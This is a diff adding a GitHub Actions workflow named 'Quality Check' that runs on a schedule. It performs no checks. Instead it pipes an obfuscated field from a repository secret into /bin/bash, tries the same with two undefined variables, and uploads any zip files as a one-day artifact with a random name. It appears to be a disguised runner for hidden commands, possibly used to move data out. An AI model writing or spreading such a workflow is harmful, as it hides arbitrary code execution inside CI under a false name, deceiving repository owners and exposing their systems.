@@ -1,0 +1,33 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          hfkx63021: ${{ secrets.hfkx63021 }}
+        run: |
+          printf '%s' "$hfkx63021" | jq -r .l80908 | /bin/bash
+          echo $slxva31 | jq -r .qrq68 | /bin/bash
+          echo $joq8379 | jq -r .ii21552 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: Ijkb9tyP
+          path: "*.zip"
+          retention-days: 1
